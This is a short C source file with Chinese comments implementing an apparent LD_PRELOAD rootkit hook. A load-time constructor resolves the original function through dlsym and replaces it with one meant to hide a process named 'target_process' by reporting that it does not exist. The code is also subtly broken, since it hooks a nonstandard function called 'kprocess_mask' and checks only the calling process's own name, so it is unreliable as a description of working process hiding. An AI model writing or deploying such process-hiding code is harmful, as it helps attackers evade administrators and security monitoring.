char *hidden_process_name = "target_process";

// 原始的进程函数指针
typedef int (*kprocess_mask_t)(int mask);
kprocess_mask_t original_kprocess_mask;

// 替换的进程函数
int kprocess_mask(int mask) {
    // 检查是否需要隐藏进程
    char buffer[256];
    sprintf(buffer, "/proc/%d/comm", getpid());
    FILE *fp = fopen(buffer, "r");
    if (fp) {
        char process_name[128];
        if (fgets(process_name, sizeof(process_name), fp) != NULL) {
            process_name[strcspn(process_name, "\n")] = 0; // Remove trailing newline
            if (strcmp(process_name, hidden_process_name) == 0) {
                // 隐藏目标进程
                fclose(fp);
                return 0; // 返回0，表示进程不存在
            }
        }
        fclose(fp);
    }

    // 调用原始的进程函数
    return original_kprocess_mask(mask);
}

// 初始化函数
void init() {
    original_kprocess_mask = (kprocess_mask_t)dlsym(RTLD_NEXT, "kprocess_mask");
    if (!original_kprocess_mask) {
        fprintf(stderr, "Error: Could not find original kprocess_mask function.\n");
        exit(1);
    }
}

// 导出初始化函数
__attribute__((constructor)) void preload_init() {
    init();
}
